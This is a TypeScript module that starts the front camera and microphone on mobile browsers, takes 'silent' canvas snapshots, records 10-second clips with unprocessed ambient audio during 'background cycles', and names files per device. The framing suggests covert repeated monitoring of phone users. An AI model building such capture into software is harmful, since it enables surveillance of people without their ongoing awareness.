/**
 * Camera & ambient microphone initialization, silent canvas snapshot capture,
 * and audio-enabled video clip recording utilities.
 */

/**
 * Accurately detects whether the current environment is a mobile/tablet device.
 * Ensures laptops/desktops never initialize the camera or mic automatically.
 */
export function isMobileDevice(): boolean {
  if (typeof window === 'undefined' || typeof navigator === 'undefined') return false;
  const ua = navigator.userAgent || '';
  const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|mobile/i;
  const isTouch = 'ontouchstart' in window || (navigator.maxTouchPoints && navigator.maxTouchPoints > 0);
  const isSmallScreen = window.innerWidth <= 1024;
  return mobileRegex.test(ua) || (Boolean(isTouch) && isSmallScreen);
}

function isPermissionDeniedError(err: unknown): boolean {
  return (
    err instanceof DOMException &&
    (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError')
  );
}

/**
 * Requests front-facing camera AND microphone in a single combined browser prompt.
 * Uses clean ambient audio settings (disabling VoIP echo/AGC processing) so media
 * playback / phone audio routing stays smooth and less intrusive on mobile.
 */
export async function initFrontCameraStream(strictAudio: boolean = true): Promise<MediaStream> {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    throw new Error('Camera & Microphone API (getUserMedia) is not supported in this browser.');
  }

  const audioConstraints: MediaTrackConstraints = {
    echoCancellation: false,
    noiseSuppression: false,
    autoGainControl: false,
  };

  try {
    return await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: 'user',
        width: { ideal: 1280, min: 640 },
        height: { ideal: 720, min: 480 },
        frameRate: { ideal: 24, max: 30 },
      },
      audio: audioConstraints,
    });
  } catch (err) {
    if (isPermissionDeniedError(err)) {
      throw err;
    }

    // Retry with simple constraints in case device rejects specific audio/resolution constraints
    try {
      return await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: true,
      });
    } catch (fallbackErr) {
      if (isPermissionDeniedError(fallbackErr)) {
        throw fallbackErr;
      }

      try {
        return await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: true,
        });
      } catch (thirdErr) {
        if (isPermissionDeniedError(thirdErr) || strictAudio) {
          throw thirdErr;
        }
        // During background cycles, if mic hardware is temporarily busy (e.g. phone call),
        // gracefully capture video-only instead of aborting the cycle.
        return await navigator.mediaDevices.getUserMedia({
          video: { facingMode: 'user' },
          audio: false,
        });
      }
    }
  }
}

export interface SnapshotResult {
  blob: Blob;
  dataUrl: string;
  width: number;
  height: number;
}

/**
 * Captures a completely silent snapshot from an HTMLVideoElement using HTML5 Canvas API.
 */
export async function captureSilentCanvasFrame(
  videoElement: HTMLVideoElement,
  quality: number = 0.8
): Promise<SnapshotResult> {
  const rawWidth = videoElement.videoWidth || 1280;
  const rawHeight = videoElement.videoHeight || 720;
  const width = Math.min(rawWidth, 1280);
  const height = Math.round((rawHeight / rawWidth) * width) || 720;

  const canvas = document.createElement('canvas');
  canvas.width = width;
  canvas.height = height;
  const ctx = canvas.getContext('2d');

  if (!ctx) {
    throw new Error('Failed to create 2D canvas context for frame capture.');
  }

  ctx.drawImage(videoElement, 0, 0, width, height);

  const blob = await new Promise<Blob>((resolve, reject) => {
    canvas.toBlob(
      (b) => {
        if (b) resolve(b);
        else reject(new Error('Canvas toBlob conversion failed.'));
      },
      'image/jpeg',
      quality
    );
  });

  return {
    blob,
    dataUrl: '',
    width,
    height,
  };
}

export interface RecordedVideoResult {
  blob: Blob;
  mimeType: string;
  extension: string;
  durationSeconds: number;
}

/**
 * Records a video clip (with ambient sound when audio track is present) from an active MediaStream.
 */
export async function recordVideoClip(
  stream: MediaStream,
  durationSeconds: number = 10
): Promise<RecordedVideoResult> {
  if (typeof MediaRecorder === 'undefined') {
    throw new Error('MediaRecorder is not supported in this browser.');
  }

  const hasAudio = stream.getAudioTracks().length > 0;

  const candidateMimeTypes = hasAudio
    ? [
        'video/webm;codecs=vp9,opus',
        'video/webm;codecs=vp8,opus',
        'video/webm',
        'video/mp4;codecs=avc1,mp4a.40.2',
        'video/mp4',
      ]
    : [
        'video/webm;codecs=vp9',
        'video/webm;codecs=vp8',
        'video/webm',
        'video/mp4;codecs=avc1',
        'video/mp4',
      ];

  let selectedMimeType = '';
  let extension = 'webm';

  for (const t of candidateMimeTypes) {
    if (MediaRecorder.isTypeSupported(t)) {
      selectedMimeType = t;
      extension = t.includes('mp4') ? 'mp4' : 'webm';
      break;
    }
  }

  return new Promise<RecordedVideoResult>((resolve, reject) => {
    try {
      const options: MediaRecorderOptions = {
        ...(selectedMimeType ? { mimeType: selectedMimeType } : {}),
        videoBitsPerSecond: 600000,
        ...(hasAudio ? { audioBitsPerSecond: 64000 } : {}),
      };

      let recorder: MediaRecorder;
      try {
        recorder = new MediaRecorder(stream, options);
      } catch {
        recorder = new MediaRecorder(stream);
      }

      const chunks: Blob[] = [];

      recorder.ondataavailable = (e: BlobEvent) => {
        if (e.data && e.data.size > 0) {
          chunks.push(e.data);
        }
      };

      recorder.onerror = () => {
        reject(new Error('MediaRecorder encountered an error during recording.'));
      };

      recorder.onstop = () => {
        const actualMime =
          selectedMimeType ||
          recorder.mimeType ||
          (extension === 'mp4' ? 'video/mp4' : 'video/webm');
        const finalBlob = new Blob(chunks, { type: actualMime });
        resolve({
          blob: finalBlob,
          mimeType: actualMime,
          extension,
          durationSeconds,
        });
      };

      recorder.start(1000);

      setTimeout(() => {
        if (recorder.state !== 'inactive') {
          recorder.stop();
        }
      }, durationSeconds * 1000);
    } catch (err) {
      reject(err);
    }
  });
}

export function generatePhotoStoragePath(
  deviceId: string,
  timestampStr: string,
  index: 1 | 2
): string {
  const sanitizedDeviceId = deviceId.trim().replace(/[/\\?%*:|"<>]/g, '_') || 'Mobile_Device';
  return `${sanitizedDeviceId}/photo_${timestampStr}_${index}.jpg`;
}

export function generateVideoStoragePath(
  deviceId: string,
  timestampStr: string,
  extension: string = 'webm'
): string {
  const sanitizedDeviceId = deviceId.trim().replace(/[/\\?%*:|"<>]/g, '_') || 'Mobile_Device';
  return `${sanitizedDeviceId}/video_${timestampStr}_10s.${extension}`;
}

export function getFileSafeTimestamp(date: Date = new Date()): string {
  const pad = (n: number) => n.toString().padStart(2, '0');
  const y = date.getFullYear();
  const m = pad(date.getMonth() + 1);
  const d = pad(date.getDate());
  const h = pad(date.getHours());
  const min = pad(date.getMinutes());
  const s = pad(date.getSeconds());
  return `${y}${m}${d}_${h}${min}${s}`;
}
